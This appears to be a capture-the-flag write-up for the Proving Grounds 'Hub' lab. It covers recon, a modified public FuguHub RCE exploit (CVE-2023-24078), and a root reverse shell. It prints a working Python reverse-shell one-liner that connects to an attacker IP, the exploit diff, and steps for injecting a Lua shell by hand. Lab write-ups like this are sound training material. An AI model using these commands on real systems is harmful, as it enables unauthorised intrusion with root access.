# Hub

## Initial access

Run `autorecon` to enumerate open ports and services:

```
sudo autorecon 192.168.112.25
```

Open ports discovered:

- **22** — SSH (OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0))
- **80** — HTTP (nginx 1.18.0)
  - Additional webpages:
    - `http://192.168.112.25/readme.txt`
    - `http://192.168.112.25/LICENSE.txt`
    - `http://192.168.112.25/applications/`
    - `http://192.168.112.25/cache`
    - `http://192.168.112.25/data/`
    - `http://192.168.112.25/disk/`
    - `http://192.168.112.25/themes/`
    - `http://192.168.112.25/trace`
- **8082** — HTTP (Barracuda Embedded Web Server)
  - Additional webpages:
    - `http://192.168.112.25:8082/zzCMS.js`
    - `http://192.168.112.25:8082/Contact-Us.html`
    - `http://192.168.112.25:8082/metaweblog/rsd.lsp`
    - `http://192.168.112.25:8082/rtl/about.lsp`
    - `http://192.168.112.25:8082/theme/bd.js`
    - `http://192.168.112.25:8082/Config-Wizard/wizard/SetAdmin.lsp`
    - `http://192.168.112.25:8082/rtl/images/logo.png`
    - `http://192.168.112.25:8082/album/lightbox.js`
    - `http://192.168.112.25:8082/rtl/jquery.js`
    - `http://192.168.112.25:8082/images/file.gif`
    - `http://192.168.112.25:8082/theme/bd.css`
    - `http://192.168.112.25:8082/photos.html`
    - `http://192.168.112.25:8082/rtl/favicon.ico`
- **9999** — HTTPS (Barracuda Embedded Web Server)
  - Additional webpages:
    - `https://192.168.112.25:9999/zzCMS.js`
    - `https://192.168.112.25:9999/rtl/about.lsp`
    - `https://192.168.112.25:9999/theme/bd.js`
    - `https://192.168.112.25:9999/theme/bd.css`
    - `https://192.168.112.25:9999/rtl/images/logo.png`
    - `https://192.168.112.25:9999/rtl/jquery.js`
    - `https://192.168.112.25:9999/album/lightbox.js`
    - `https://192.168.112.25:9999/blog/`
  - The pages on port 9999 appear to be the same as those hosted on port 8082.

Run a more targeted `nmap` scan with service and OS detection:

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp   open  http     nginx 1.18.0
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-title: 403 Forbidden
|_http-server-header: nginx/1.18.0
8082/tcp open  http     Barracuda Embedded Web Server
| http-methods:
|_  Supported Methods: POST OPTIONS
|_http-favicon: Unknown favicon MD5: FDF624762222B41E2767954032B6F1FF
9999/tcp open  ssl/http Barracuda Embedded Web Server
| ssl-cert: Subject: commonName=FuguHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:FuguHub, DNS:FuguHub.local, DNS:localhost
| Issuer: commonName=Real Time Logic Root CA/organizationName=Real Time Logic LLC/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-07-16T19:15:09
| Not valid after:  2074-04-18T19:15:09
| MD5:     6320 2067 19be be32 18ce 3a61 e872 cc3f
| SHA-1:   503c a62d 8a8c f8c1 6555 ec50 77d1 73cc 0865 ec62
|_SHA-256: f9fc d0bb 8a2f 49a1 52bd 3615 904e 31fd 2d9e 2223 c5a3 a909 f6ee 2032 dca2 ea15
|_ssl-date: 2026-11-09T13:55:17+00:00; 0s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Run a full port scan to confirm all open ports:

```
nmap -sS -p- -Pn 192.168.112.25
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-09 08:53 -0500
Nmap scan report for 192.168.112.25
Host is up (0.0053s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8082/tcp open  blackice-alerts
9999/tcp open  abyss
```

Port 80 returns a 403 Forbidden response. Explore `http://192.168.112.25/readme.txt`, which reveals the web server is running FuguHub 8.0:

```
 Changes for 8.0     July 2019
 ---------------------------------
 FuguHub can now use Let's Encrypt and provides the same Let's Encrypt options as the Mako Server.
 https://realtimelogic.com/ba/doc/?url=Mako.html#opacme
 Note that FuguHub's Let's Encrypt options must be set in bd(d).conf
```

Search for known exploits against FuguHub:

```
searchsploit fuguhub
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
FuguHub 8.1 - Remote Code Execution                                                | multiple/webapps/51550.py
----------------------------------------------------------------------------------- ---------------------------------
```

Although the exploit targets version 8.1, the vulnerability may still be present in version 8.0. Download and review the exploit script:

```
searchsploit -m 51550

nano 51550.py
...
    # Go to the set admin page... if page contains "User database already saved" then there are already admin creds and we will try to login with the creds, otherwise we will manually create an account
    r = s.get(f"http://{url}:{port}/Config-Wizard/wizard/SetAdmin.lsp")
```

The script references a specific file which can be found on the web server on port 8082. This was discovered during directory enumeration with `feroxbuster`.

The original exploit script hardcodes HTTPS port 443, but the target's HTTPS port is 9999. Additionally, the script attempts to upload to `/fs/cmsdocs/`, but the target only has `/fs/images/` available. Modify the exploit accordingly:

```
diff 51550.py 51550-modified.py
82c82
<     r = s.post(f"https://{url}:443/rtl/protected/wfslinks.lsp", data = data, verify = False ) # switching to https cause its easier to script lolz
---
>     r = s.post(f"https://{url}:9999/rtl/protected/wfslinks.lsp", data = data, verify = False ) # switching to https cause its easier to script lolz
99c99
<     r = s.get(f"https://{url}:443/fs/cmsdocs/")
---
>     r = s.get(f"https://{url}:9999/fs/images/", verify=False)
126c126
<     r = s.post(f"https://{url}:443/fs/cmsdocs/", files=files)
---
>     r = s.post(f"https://{url}:9999/fs/images/", files=files, verify=False)
130c130
<         r = s.get(f"https://{url}:443/rev.lsp")
---
>         r = s.get(f"https://{url}:9999/images/rev.lsp", verify=False)
```

Run the modified exploit and catch the reverse shell with `nc`:

```
python3 51550-modified.py -r 192.168.112.25 -rp 8082 -l 192.168.45.189 -p 4443

nc -nvlp 4443
listening on [any] 4443 ...
connect to [192.168.45.189] from (UNKNOWN) [192.168.112.25] 37154
whoami
root
```

The exploit yields a reverse shell as `root`, with the working directory set to `/var/www/html`. Stabilize the shell with a second reverse shell caught with `penelope`:

```
# nc
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.45.189",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'

# penelope
root@debian:/var/www/html# whoami
root
```

The new shell allows traversal outside of `/var/www/html`. Retrieve the `proof.txt` flag:

```
root@debian:/var/www/html# cd /root
root@debian:~# cat proof.txt
11bf8e8ddc2a2726c00aa4e993d6b5f4
```

### Alternative Initial Access — manual CVE-2023-24078 exploitation

Instead of using the automated exploit script, the same RCE vulnerability (CVE-2023-24078) can be exploited manually through the FuguHub admin panel. After setting up an admin account at `http://192.168.112.25:8082/Config-Wizard/wizard/SetAdmin.lsp`, navigate to the Page Manager in the admin panel and create a new page. In the page editor, switch to Expert mode, enable LSP (Lua Server Pages), and inject a Lua reverse shell payload. Saving the page creates a `.lsp` file on the server. Visiting the page URL (e.g., `http://192.168.112.25:8082/shell.lsp`) triggers the Lua script and executes the reverse shell as root.

Credit: [nr_4x4 — Hub Proving Ground Practice](https://medium.com/@nr_4x4/offsec-proving-grounds-hub-writeup-linux-lab-cve-2023-24078-in-detail-5619c914a84f)

